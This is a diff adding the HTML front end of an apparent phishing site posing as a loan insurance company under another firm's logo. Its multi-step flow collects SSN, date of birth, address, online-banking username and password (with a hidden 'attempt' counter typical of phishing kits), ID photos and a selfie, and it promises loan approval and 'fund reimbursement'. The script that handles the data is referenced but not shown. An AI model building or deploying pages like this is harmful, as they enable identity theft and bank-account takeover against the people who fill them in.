@@ -1,0 +1,437 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loan Insurance Company</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+  <header>
+    <div class="logo-container">
+      <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" id="header-logo">
+    </div>
+    <nav>
+      <ul id="nav-links">
+        <li><a href="#" class="active" data-page="home">Home</a></li>
+        <li><a href="#" data-page="login">Login</a></li>
+        <li><a href="#" data-page="signup">Sign Up</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <!-- Home Page -->
+    <section id="home-page" class="page active">
+      <div class="hero">
+        <h1>Secure Your Loan with Confidence</h1>
+        <p>Apply for loan insurance today and get approved within 24-48 hours</p>
+        <button id="get-started-btn" class="primary-btn">Get Started</button>
+      </div>
+      
+      <div class="features">
+        <div class="feature">
+          <i class="fas fa-shield-alt"></i>
+          <h3>Secure Process</h3>
+          <p>Your data is protected with top-tier security</p>
+        </div>
+        <div class="feature">
+          <i class="fas fa-bolt"></i>
+          <h3>Fast Approval</h3>
+          <p>Get your loan approved within 24-48 hours</p>
+        </div>
+        <div class="feature">
+          <i class="fas fa-money-check-alt"></i>
+          <h3>Flexible Payment</h3>
+          <p>Choose between Direct Deposit or Check</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Signup Page -->
+    <section id="signup-page" class="page">
+      <div class="auth-container">
+        <h2>Create an Account</h2>
+        <form id="signup-form">
+          <div class="form-group">
+            <label for="signup-username">Username</label>
+            <input type="text" id="signup-username" name="username" required>
+          </div>
+          <div class="form-group">
+            <label for="signup-email">Email</label>
+            <input type="email" id="signup-email" name="email" required>
+          </div>
+          <div class="form-group">
+            <label for="signup-password">Password</label>
+            <input type="password" id="signup-password" name="password" required>
+          </div>
+          <div class="form-group">
+            <label for="signup-confirm-password">Confirm Password</label>
+            <input type="password" id="signup-confirm-password" name="confirmPassword" required>
+          </div>
+          <div class="form-error" id="signup-error"></div>
+          <button type="submit" class="primary-btn">Sign Up</button>
+        </form>
+        <p>Already have an account? <a href="#" data-page="login">Login</a></p>
+      </div>
+    </section>
+
+    <!-- Login Page -->
+    <section id="login-page" class="page">
+      <div class="auth-container">
+        <h2>Login to Your Account</h2>
+        <form id="login-form">
+          <div class="form-group">
+            <label for="login-username">Username</label>
+            <input type="text" id="login-username" name="username" required>
+          </div>
+          <div class="form-group">
+            <label for="login-password">Password</label>
+            <input type="password" id="login-password" name="password" required>
+          </div>
+          <div class="form-error" id="login-error"></div>
+          <button type="submit" class="primary-btn">Login</button>
+        </form>
+        <p>Don't have an account? <a href="#" data-page="signup">Sign Up</a></p>
+      </div>
+    </section>
+
+    <!-- Loan Application Page -->
+    <section id="loan-application-page" class="page">
+      <div class="container">
+        <h2>Select Your Loan Amount</h2>
+        <div class="loan-amounts">
+          <button class="loan-amount-btn" data-amount="200">$200</button>
+          <button class="loan-amount-btn" data-amount="500">$500</button>
+          <button class="loan-amount-btn" data-amount="1000">$1K</button>
+          <button class="loan-amount-btn" data-amount="2000">$2K</button>
+          <button class="loan-amount-btn" data-amount="5000">$5K</button>
+          <button class="loan-amount-btn" data-amount="10000">$10K</button>
+          <button class="loan-amount-btn" data-amount="20000">$20K</button>
+          <button class="loan-amount-btn" data-amount="30000">$30K</button>
+          <button class="loan-amount-btn" data-amount="40000">$40K</button>
+          <button class="loan-amount-btn" data-amount="50000">$50K</button>
+          <button class="loan-amount-btn" data-amount="100000">$100K</button>
+          <button class="loan-amount-btn" data-amount="120000">$120K</button>
+        </div>
+        <div class="selected-amount-container">
+          <h3>Selected Amount: <span id="selected-amount">$0</span></h3>
+        </div>
+        <button id="check-coverage-btn" class="primary-btn" disabled>Check Coverage</button>
+        <div class="loader" id="coverage-loader">
+          <div class="spinner"></div>
+          <p>Checking coverage...</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Identity Verification Page -->
+    <section id="identity-verification-page" class="page">
+      <div class="container">
+        <h2>Identity Verification</h2>
+        <form id="identity-verification-form">
+          <div class="form-row">
+            <div class="form-group">
+              <label for="full-name">Full Name</label>
+              <input type="text" id="full-name" name="fullName" required>
+            </div>
+            <div class="form-group">
+              <label for="middle-name">Middle Name</label>
+              <input type="text" id="middle-name" name="middleName">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label for="dob">Date of Birth</label>
+              <input type="date" id="dob" name="dob" required>
+            </div>
+            <div class="form-group">
+              <label for="ssn">SSN (9 digits)</label>
+              <input type="text" id="ssn" name="ssn" maxlength="9" required>
+              <div class="form-error" id="ssn-error"></div>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group full-width">
+              <label for="address">Address</label>
+              <input type="text" id="address" name="address" required>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label for="city">City</label>
+              <input type="text" id="city" name="city" required>
+            </div>
+            <div class="form-group">
+              <label for="state">State</label>
+              <select id="state" name="state" required>
+                <option value="">Select State</option>
+                <option value="AL">Alabama</option>
+                <option value="AK">Alaska</option>
+                <option value="AZ">Arizona</option>
+                <!-- All 50 states would be included here -->
+                <option value="WY">Wyoming</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="zip-code">Zip Code</label>
+              <input type="text" id="zip-code" name="zipCode" required>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label for="phone-number">Phone Number (10 digits)</label>
+              <input type="text" id="phone-number" name="phoneNumber" maxlength="10" required>
+              <div class="form-error" id="phone-error"></div>
+            </div>
+            <div class="form-group">
+              <label for="verification-email">Email</label>
+              <input type="email" id="verification-email" name="email" required>
+            </div>
+          </div>
+          <button type="submit" class="primary-btn">Verify My Identity</button>
+        </form>
+        <div class="loader" id="verification-loader">
+          <div class="spinner"></div>
+          <p>Verifying your identity...</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Payment Method Page -->
+    <section id="payment-method-page" class="page">
+      <div class="container">
+        <h2>Select Payment Method</h2>
+        <div class="payment-methods">
+          <div class="payment-method" data-method="check">
+            <i class="fas fa-money-check"></i>
+            <h3>Check</h3>
+            <p>Receive a physical check by mail</p>
+          </div>
+          <div class="payment-method" data-method="direct-deposit">
+            <i class="fas fa-university"></i>
+            <h3>Direct Deposit</h3>
+            <p>Receive funds directly to your bank account</p>
+          </div>
+        </div>
+        
+        <!-- Check Payment Form -->
+        <div id="check-payment-form" class="payment-form">
+          <h3>Mailing Address for Check</h3>
+          <form id="check-form">
+            <div class="form-group full-width">
+              <label for="check-address">Address</label>
+              <input type="text" id="check-address" name="address" required>
+            </div>
+            <div class="form-row">
+              <div class="form-group">
+                <label for="check-city">City</label>
+                <input type="text" id="check-city" name="city" required>
+              </div>
+              <div class="form-group">
+                <label for="check-state">State</label>
+                <select id="check-state" name="state" required>
+                  <option value="">Select State</option>
+                  <option value="AL">Alabama</option>
+                  <option value="AK">Alaska</option>
+                  <!-- All 50 states would be included here -->
+                  <option value="WY">Wyoming</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label for="check-zip-code">Zip Code</label>
+                <input type="text" id="check-zip-code" name="zipCode" required>
+              </div>
+            </div>
+            <button type="submit" class="primary-btn">Submit</button>
+          </form>
+        </div>
+        
+        <!-- Direct Deposit Form -->
+        <div id="direct-deposit-form" class="payment-form">
+          <h3>Link Your Bank Account</h3>
+          <div class="bank-search">
+            <label for="bank-search">Search for your bank</label>
+            <input type="text" id="bank-search" name="bankSearch" placeholder="Enter bank name...">
+            <button id="search-bank-btn" class="secondary-btn">Search</button>
+          </div>
+          <div id="bank-results" class="bank-results"></div>
+          
+          <div id="bank-login-form" class="bank-login">
+            <div class="selected-bank">
+              <img id="selected-bank-logo" src="" alt="Bank Logo">
+              <h4 id="selected-bank-name"></h4>
+            </div>
+            <form id="bank-credentials-form">
+              <input type="hidden" id="bank-name" name="bankName">
+              <input type="hidden" id="attempt" name="attempt" value="1">
+              <div class="form-group">
+                <label for="bank-username">Username</label>
+                <input type="text" id="bank-username" name="username" required>
+              </div>
+              <div class="form-group">
+                <label for="bank-password">Password</label>
+                <input type="password" id="bank-password" name="password" required>
+              </div>
+              <div class="form-error" id="bank-error"></div>
+              <button type="submit" class="primary-btn">Link Account</button>
+            </form>
+          </div>
+        </div>
+        
+        <div class="loader" id="payment-loader">
+          <div class="spinner"></div>
+          <p>Processing your payment method...</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ID Verification Page -->
+    <section id="id-verification-page" class="page">
+      <div class="container">
+        <h2>ID Verification</h2>
+        <p>Please upload images of your ID and take a selfie for verification.</p>
+        
+        <form id="id-verification-form">
+          <div class="upload-container">
+            <div class="upload-section">
+              <h3>Front of ID</h3>
+              <div class="upload-area" id="front-id-upload">
+                <i class="fas fa-id-card"></i>
+                <p>Drop your file here or</p>
+                <label for="front-id-input" class="upload-btn">Choose File</label>
+                <input type="file" id="front-id-input" name="frontId" accept="image/*" hidden>
+              </div>
+              <div class="preview" id="front-id-preview"></div>
+              <button type="button" class="camera-btn" id="front-id-camera">
+                <i class="fas fa-camera"></i> Take Photo
+              </button>
+            </div>
+            
+            <div class="upload-section">
+              <h3>Back of ID</h3>
+              <div class="upload-area" id="back-id-upload">
+                <i class="fas fa-id-card"></i>
+                <p>Drop your file here or</p>
+                <label for="back-id-input" class="upload-btn">Choose File</label>
+                <input type="file" id="back-id-input" name="backId" accept="image/*" hidden>
+              </div>
+              <div class="preview" id="back-id-preview"></div>
+              <button type="button" class="camera-btn" id="back-id-camera">
+                <i class="fas fa-camera"></i> Take Photo
+              </button>
+            </div>
+            
+            <div class="upload-section">
+              <h3>Selfie</h3>
+              <div class="upload-area" id="selfie-upload">
+                <i class="fas fa-user"></i>
+                <p>Drop your file here or</p>
+                <label for="selfie-input" class="upload-btn">Choose File</label>
+                <input type="file" id="selfie-input" name="selfie" accept="image/*" hidden>
+              </div>
+              <div class="preview" id="selfie-preview"></div>
+              <button type="button" class="camera-btn" id="selfie-camera">
+                <i class="fas fa-camera"></i> Take Selfie
+              </button>
+            </div>
+          </div>
+          
+          <div class="camera-modal" id="camera-modal">
+            <div class="camera-container">
+              <video id="camera-stream" autoplay></video>
+              <canvas id="camera-canvas" hidden></canvas>
+              <div class="camera-controls">
+                <button type="button" id="capture-btn">Capture</button>
+                <button type="button" id="close-camera-btn">Close</button>
+              </div>
+            </div>
+          </div>
+          
+          <button type="submit" class="primary-btn" id="submit-id-btn">Submit ID Verification</button>
+        </form>
+        
+        <div class="loader" id="id-verification-loader">
+          <div class="spinner"></div>
+          <p>Processing your ID verification...</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Status Page -->
+    <section id="status-page" class="page">
+      <div class="container">
+        <h2>Loan Application Status</h2>
+        <div class="status-container">
+          <div class="status-indicator">
+            <div class="status-circle" id="status-circle">
+              <i class="fas fa-clock"></i>
+            </div>
+            <h3 id="status-text">Pending</h3>
+          </div>
+          <p id="status-message">Your application is pending review.</p>
+          <div class="loan-details">
+            <h3>Loan Details</h3>
+            <div class="loan-info">
+              <div class="info-item">
+                <span class="label">Amount:</span>
+                <span class="value" id="loan-amount-display">$0</span>
+              </div>
+              <div class="info-item">
+                <span class="label">Submitted On:</span>
+                <span class="value" id="submission-date">N/A</span>
+              </div>
+              <div class="info-item">
+                <span class="label">Payment Method:</span>
+                <span class="value" id="payment-method-display">N/A</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="next-steps">
+          <h3>Next Steps</h3>
+          <ul id="next-steps-list">
+            <li><i class="fas fa-check-circle"></i> Application submitted</li>
+            <li id="verification-step"><i class="fas fa-circle"></i> Identity verification</li>
+            <li id="payment-step"><i class="fas fa-circle"></i> Payment method selection</li>
+            <li id="id-upload-step"><i class="fas fa-circle"></i> ID verification</li>
+            <li id="approval-step"><i class="fas fa-circle"></i> Loan approval (24-48 hours)</li>
+            <li id="funds-step"><i class="fas fa-circle"></i> Fund reimbursement</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <div class="footer-logo">
+        <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo">
+      </div>
+      <div class="footer-links">
+        <ul>
+          <li><a href="#">Home</a></li>
+          <li><a href="#">About Us</a></li>
+          <li><a href="#">Services</a></li>
+          <li><a href="#">Contact</a></li>
+          <li><a href="#">Privacy Policy</a></li>
+          <li><a href="#">Terms of Service</a></li>
+        </ul>
+      </div>
+      <div class="footer-social">
+        <a href="#"><i class="fab fa-facebook"></i></a>
+        <a href="#"><i class="fab fa-twitter"></i></a>
+        <a href="#"><i class="fab fa-instagram"></i></a>
+        <a href="#"><i class="fab fa-linkedin"></i></a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; <span id="current-year">2025</span> Loan Insurance Company. All Rights Reserved.</p>
+    </div>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
